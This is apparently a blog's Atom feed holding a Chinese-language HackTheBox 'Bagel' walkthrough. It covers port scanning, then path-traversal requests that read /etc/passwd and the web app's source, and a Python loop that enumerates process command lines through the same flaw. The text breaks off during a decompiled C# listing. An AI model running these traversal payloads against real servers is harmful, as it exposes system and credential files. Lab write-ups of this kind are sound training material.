<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xXxYOLOxXx</title>
  
  <subtitle>xXxYOLOxXx</subtitle>
  <link href="https://yoloyolo.top/atom.xml" rel="self"/>
  
  <link href="https://yoloyolo.top/"/>
  <updated>2023-03-25T10:30:14.553Z</updated>
  <id>https://yoloyolo.top/</id>
  
  <author>
    <name>xXxYOLOxXx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox_Bagel</title>
    <link href="https://yoloyolo.top/2023/03/25/HackTheBox-Bagel/"/>
    <id>https://yoloyolo.top/2023/03/25/HackTheBox-Bagel/</id>
    <published>2023-03-25T10:21:56.000Z</published>
    <updated>2023-03-25T10:30:14.553Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_bagel"><a class="markdownIt-Anchor" href="#hackthebox_bagel"></a> HackTheBox_Bagel</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.201</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.201</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)</span><br><span class="line">5000&#x2F;tcp open  upnp?</span><br><span class="line">8000&#x2F;tcp open  http-alt Werkzeug&#x2F;2.2.2 Python&#x2F;3.10.9</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port5000-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;25%Time&#x3D;641E89C8%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,73,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft</span><br><span class="line">SF:-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:31\x20GMT\</span><br><span class="line">SF:r\nConnection:\x20close\r\n\r\n&quot;)%r(RTSPRequest,E8,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-N</span><br><span class="line">SF:etCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:32\x20GMT\r\</span><br><span class="line">SF:nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r</span><br><span class="line">SF:\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)</span><br><span class="line">SF:\.\)&lt;&#x2F;h1&gt;&quot;)%r(HTTPOptions,73,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nSer</span><br><span class="line">SF:ver:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2</span><br><span class="line">SF:005:42:48\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;)%r(Help,E6,&quot;HTTP&#x2F;1\.1</span><br><span class="line">SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20M</span><br><span class="line">SF:icrosoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:43:00</span><br><span class="line">SF:\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:</span><br><span class="line">SF:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\</span><br><span class="line">SF:(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(SSLSessionReq,E6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Requ</span><br><span class="line">SF:est\r\nContent-Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-NetCore&#x2F;2\.0\</span><br><span class="line">SF:r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:43:00\x20GMT\r\nContent-Len</span><br><span class="line">SF:gth:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Ba</span><br><span class="line">SF:d\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(</span><br><span class="line">SF:TerminalServerCookie,E6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nContent-</span><br><span class="line">SF:Type:\x20text&#x2F;html\r\nServer:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat</span><br><span class="line">SF:,\x2025\x20Mar\x202023\x2005:43:01\x20GMT\r\nContent-Length:\x2052\r\nC</span><br><span class="line">SF:onnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x2</span><br><span class="line">SF:0\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;)%r(TLSSessionReq,E</span><br><span class="line">SF:6,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text&#x2F;html\r\n</span><br><span class="line">SF:Server:\x20Microsoft-NetCore&#x2F;2\.0\r\nDate:\x20Sat,\x2025\x20Mar\x202023</span><br><span class="line">SF:\x2005:43:02\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\</span><br><span class="line">SF:nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\</span><br><span class="line">SF:x20line\x20\(parts\)\.\)&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port8000-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;25%Time&#x3D;641E89C3%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,1EA,&quot;HTTP&#x2F;1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug&#x2F;2\.2\.2\</span><br><span class="line">SF:x20Python&#x2F;3\.10\.9\r\nDate:\x20Sat,\x2025\x20Mar\x202023\x2005:42:26\x2</span><br><span class="line">SF:0GMT\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:</span><br><span class="line">SF:\x20263\r\nLocation:\x20http:&#x2F;&#x2F;bagel\.htb:8000&#x2F;\?page&#x3D;index\.html\r\nCo</span><br><span class="line">SF:nnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang&#x3D;en&gt;\n&lt;title</span><br><span class="line">SF:&gt;Redirecting\.\.\.&lt;&#x2F;title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;&#x2F;h1&gt;\n&lt;p&gt;You\x20shoul</span><br><span class="line">SF:d\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x</span><br><span class="line">SF:20&lt;a\x20href&#x3D;\&quot;http:&#x2F;&#x2F;bagel\.htb:8000&#x2F;\?page&#x3D;index\.html\&quot;&gt;http:&#x2F;&#x2F;bagel</span><br><span class="line">SF:\.htb:8000&#x2F;\?page&#x3D;index\.html&lt;&#x2F;a&gt;\.\x20If\x20not,\x20click\x20the\x20li</span><br><span class="line">SF:nk\.\n&quot;)%r(FourOhFourRequest,184,&quot;HTTP&#x2F;1\.1\x20404\x20NOT\x20FOUND\r\nS</span><br><span class="line">SF:erver:\x20Werkzeug&#x2F;2\.2\.2\x20Python&#x2F;3\.10\.9\r\nDate:\x20Sat,\x2025\x2</span><br><span class="line">SF:0Mar\x202023\x2005:42:32\x20GMT\r\nContent-Type:\x20text&#x2F;html;\x20chars</span><br><span class="line">SF:et&#x3D;utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doc</span><br><span class="line">SF:type\x20html&gt;\n&lt;html\x20lang&#x3D;en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;&#x2F;title&gt;\n&lt;</span><br><span class="line">SF:h1&gt;Not\x20Found&lt;&#x2F;h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found</span><br><span class="line">SF:\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manu</span><br><span class="line">SF:ally\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;&#x2F;p</span><br><span class="line">SF:&gt;\n&quot;)%r(Socks5,213,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD\x20HTM</span><br><span class="line">SF:L\x204\.01&#x2F;&#x2F;EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http:&#x2F;&#x2F;www\.w3\.org</span><br><span class="line">SF:&#x2F;TR&#x2F;html4&#x2F;strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20&lt;meta\x20http-equiv&#x3D;\&quot;Content-Type\&quot;\x20content&#x3D;\&quot;te</span><br><span class="line">SF:xt&#x2F;html;charset&#x3D;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\</span><br><span class="line">SF:x20response&lt;&#x2F;title&gt;\n\x20\x20\x20\x20&lt;&#x2F;head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;&#x2F;h1&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;&#x2F;p&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\\x05\\x04\\x0</span><br><span class="line">SF:0\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;&#x2F;p&gt;\n\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20</span><br><span class="line">SF:-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;&#x2F;p&gt;\n\x2</span><br><span class="line">SF:0\x20\x20\x20&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;);</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>获得域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.201:8000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: Werkzeug&#x2F;2.2.2 Python&#x2F;3.10.9</span><br><span class="line">Date: Sat, 25 Mar 2023 05:42:27 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 263</span><br><span class="line">Location: http:&#x2F;&#x2F;bagel.htb:8000&#x2F;?page&#x3D;index.html</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.201\tbagel.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>8000端口 Python Web服务<br />5000端口直接400<br />扫个锤子的路径</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>重定向到<code>http://bagel.htb:8000/?page=index.html</code></p><p>LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync</span><br><span class="line">shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown</span><br><span class="line">halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt</span><br><span class="line">mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</span><br><span class="line">operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin</span><br><span class="line">games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:Kernel Overflow User:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:59:59:Account used for TPM access:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-oom:x:999:999:systemd Userspace OOM Killer:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:193:193:systemd Resolver:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">polkitd:x:998:997:User for polkitd:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpc:x:32:32:Rpcbind Daemon:&#x2F;var&#x2F;lib&#x2F;rpcbind:&#x2F;sbin&#x2F;nologin</span><br><span class="line">abrt:x:173:173::&#x2F;etc&#x2F;abrt:&#x2F;sbin&#x2F;nologin</span><br><span class="line">setroubleshoot:x:997:995:SELinux troubleshoot server:&#x2F;var&#x2F;lib&#x2F;setroubleshoot:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cockpit-ws:x:996:994:User for cockpit web service:&#x2F;nonexisting:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cockpit-wsinstance:x:995:993:User for cockpit-ws instances:&#x2F;nonexisting:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;share&#x2F;empty.sshd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">chrony:x:994:992::&#x2F;var&#x2F;lib&#x2F;chrony:&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:&#x2F;var&#x2F;lib&#x2F;dnsmasq:&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:72:72::&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:989:989:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:988:988:systemd Time Synchronization:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">developer:x:1000:1000::&#x2F;home&#x2F;developer:&#x2F;bin&#x2F;bash</span><br><span class="line">phil:x:1001:1001::&#x2F;home&#x2F;phil:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:987:987::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>尝试读取WEB代码文件</p><p><del><a href="http://app.py">app.py</a> or <a href="http://index.py">index.py</a> or <a href="http://main.py">main.py</a></del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../app.py</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, redirect, Response</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> websocket,json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;page&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">            page = <span class="string">&#x27;static/&#x27;</span>+request.args.get(<span class="string">&#x27;page&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(page):</span><br><span class="line">                resp=send_file(page)</span><br><span class="line">                resp.direct_passthrough = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> os.path.getsize(page) == <span class="number">0</span>:</span><br><span class="line">                    resp.headers[<span class="string">&quot;Content-Length&quot;</span>]=<span class="built_in">str</span>(<span class="built_in">len</span>(resp.get_data()))</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;http://bagel.htb:8000/?page=index.html&#x27;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/orders&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span> <span class="comment"># don&#x27;t forget to run the order app first with &quot;dotnet &lt;path to .dll&gt;&quot; command. Use your ssh key to access the machine.</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ws = websocket.WebSocket()    </span><br><span class="line">        ws.connect(<span class="string">&quot;ws://127.0.0.1:5000/&quot;</span>) <span class="comment"># connect to order app</span></span><br><span class="line">        order = &#123;<span class="string">&quot;ReadOrder&quot;</span>:<span class="string">&quot;orders.txt&quot;</span>&#125;</span><br><span class="line">        data = <span class="built_in">str</span>(json.dumps(order))</span><br><span class="line">        ws.send(data)</span><br><span class="line">        result = ws.recv()</span><br><span class="line">        <span class="keyword">return</span>(json.loads(result)[<span class="string">&#x27;ReadOrder&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&quot;Unable to connect&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>这里提到dll文件和SSH key</p><p>编写<code>cmdline.py</code>如下，用于枚举进程命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmdline.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://bagel.htb:8000/?page=../../../../proc/%d/cmdline&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2000</span>):</span><br><span class="line">res = req.get(url % _)</span><br><span class="line">print(<span class="string">&quot;%s: %s&quot;</span> % (_, res.text))</span><br></pre></td></tr></table></figure><p>找到一个相关命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">891: dotnet&#x2F;opt&#x2F;bagel&#x2F;bin&#x2F;Debug&#x2F;net6.0&#x2F;bagel.dll</span><br></pre></td></tr></table></figure><p><code>/proc/$pid/cmdline</code>中<code>\x20</code>会变成<code>\x00</code></p><p>所以原始命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll</span><br></pre></td></tr></table></figure><p>获取bagel.dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll -o /tmp/bagel.dll</span><br></pre></td></tr></table></figure><p>官方论坛上有人提到<code>ilspycmd</code></p><blockquote><p>dotnet tool install --global ilspycmd --version 7.2.1.6856</p></blockquote><p>但是我以global安装后ilspycmd没有出现在PATH路径下<br />懒得找了，以local方式安装吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dotnet new tool-manifest</span><br><span class="line">dotnet tool install ilspycmd</span><br><span class="line">dotnet tool run ilspycmd /tmp/bagel.dll</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span 